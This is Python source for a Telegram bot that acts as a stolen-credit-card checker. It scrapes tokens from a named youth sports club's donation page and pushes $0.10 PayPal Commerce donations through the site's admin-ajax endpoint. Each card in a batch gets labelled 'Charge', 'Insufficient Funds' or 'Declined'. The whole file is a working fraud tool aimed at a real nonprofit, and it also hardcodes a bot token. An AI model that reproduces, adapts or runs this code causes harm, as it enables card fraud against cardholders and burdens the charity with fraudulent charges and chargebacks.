import telebot
import requests
import base64
import re
import time
from user_agent import generate_user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder
import os
import logging

# إعداد السجلات
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

TOKEN = os.getenv('BOT_TOKEN', '8709460165:AAFnoYKpwLGINPx7002oAXnHk0dEPUqyFuI')
bot = telebot.TeleBot(TOKEN)

def kefara(ccx):
    try:
        r = requests.Session()
        user = generate_user_agent()
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) < 4: return "❌ Invalid Format"
        
        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3].strip()
        if "20" in yy and len(yy) == 4: yy = yy.split("20")[1]
            
        headers = {'user-agent': user}
        
        # المرحلة 1
        response = r.get('https://www.northidahowaterpolo.org/donations/donation-form/', headers=headers, timeout=15)
        try:
            id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
            id_form2 = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
            nonec = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
            enc = re.search(r'"data-client-token":"(.*?)"', response.text).group(1)
            dec = base64.b64decode(enc).decode('utf-8')
            au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
        except: return "❌ Gateway Error (Tokens)"

        headers = {
            'origin': 'https://www.northidahowaterpolo.org',
            'referer': 'https://www.northidahowaterpolo.org/donations/donation-form/',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        # المرحلة 2 & 3
        multipart_data = MultipartEncoder({
            'give-form-id-prefix': (None, id_form1),
            'give-form-id': (None, id_form2),
            'give-form-hash': (None, nonec),
            'give-amount': (None, '0.10'),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, 'KEFARA'),
            'give_last': (None, 'rights and'),
            'give_email': (None, 'kefara22@gmail.com'),
            'give-gateway': (None, 'paypal-commerce'),
        })
        
        headers['content-type'] = multipart_data.content_type
        response = r.post('https://www.northidahowaterpolo.org/wp-admin/admin-ajax.php', params={'action': 'give_paypal_commerce_create_order'}, headers=headers, data=multipart_data, timeout=15)
        
        try:
            tok = response.json()['data']['id']
        except: return "❌ Gateway Error (Order)"
        
        # المرحلة 4
        headers_paypal = {
            'authorization': f'Bearer {au}',
            'content-type': 'application/json',
            'user-agent': user,
        }
        json_data = {
            'payment_source': {'card': {'number': n, 'expiry': f'20{yy}-{mm}', 'security_code': cvc, 'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}}},
            'application_context': {'vault': False},
        }
        
        response = r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=headers_paypal, json=json_data, timeout=15)
        
        # التحقق من رد PayPal المباشر
        if response.status_code != 200:
            try:
                err_json = response.json()
                issue = err_json.get('details', [{}])[0].get('issue', 'DECLINED')
                if issue == 'PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING': return "❌ Gateway Dead (Payee Error)"
                return f"❌ {issue}"
            except: return "❌ Declined by Gateway"
        
        # المرحلة 5
        params_approve = {'action': 'give_paypal_commerce_approve_order', 'order': tok}
        response = r.post('https://www.northidahowaterpolo.org/wp-admin/admin-ajax.php', params=params_approve, headers=headers, data=multipart_data, timeout=15)
        
        text = response.text
        if 'true' in text or 'sucsess' in text: return "✅ Charge !"
        elif 'INSUFFICIENT_FUNDS' in text: return '❌ Insufficient Funds'
        else: return "❌ Declined"
                
    except Exception as e:
        return f"⚠️ Error: {str(e)[:50]}"

def format_result(combo, result):
    status_icon = "💳"
    if "Charge" in result: status_icon = "🔥"
    elif "Insufficient Funds" in result: status_icon = "💰"
    
    msg = f"━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"✨ **Card Check Result** ✨\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"📍 **Card:** `{combo}`\n"
    msg += f"💠 **Status:** {result} {status_icon}\n"
    msg += f"🌐 **Gateway:** PayPal Commerce\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"👤 **Checked By:** @{bot.get_me().username}\n"
    return msg

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "👋 **أهلاً بك!**\n\nأرسل `/pp [combo]` للفحص.", parse_mode='Markdown')

@bot.message_handler(commands=['pp'])
def check_pp(message):
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "❌ **أرسل الكومبو بعد الأمر!**", parse_mode='Markdown')
            return
        
        combo = args[1]
        msg = bot.reply_to(message, "🔍 **جاري الفحص...**", parse_mode='Markdown')
        result = kefara(combo)
        bot.edit_message_text(format_result(combo, result), message.chat.id, msg.message_id, parse_mode='Markdown')
    except Exception as e: logging.error(f"Error in /pp: {e}")

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    try:
        if message.document.file_name.endswith('.txt'):
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            with open("temp_combo.txt", 'wb') as f: f.write(downloaded_file)
            
            status_msg = bot.reply_to(message, "📥 **جاري معالجة الملف...**", parse_mode='Markdown')
            with open("temp_combo.txt", 'r') as f:
                lines = [line.strip() for line in f.readlines() if line.strip()]
            
            results = []
            for i, line in enumerate(lines[:30]):
                res = kefara(line)
                results.append(f"🔹 `{line}` -> {res}")
                if (i + 1) % 5 == 0:
                    try: bot.edit_message_text(f"⏳ **جاري الفحص: {i+1}/{len(lines)}**", message.chat.id, status_msg.message_id, parse_mode='Markdown')
                    except: pass
            
            bot.edit_message_text("📊 **النتائج:**\n\n" + "\n".join(results), message.chat.id, status_msg.message_id, parse_mode='Markdown')
            if os.path.exists("temp_combo.txt"): os.remove("temp_combo.txt")
        else:
            bot.reply_to(message, "⚠️ **ارفع ملف .txt فقط!**", parse_mode='Markdown')
    except Exception as e: logging.error(f"Error in docs: {e}")

if __name__ == "__main__":
    bot.infinity_polling()
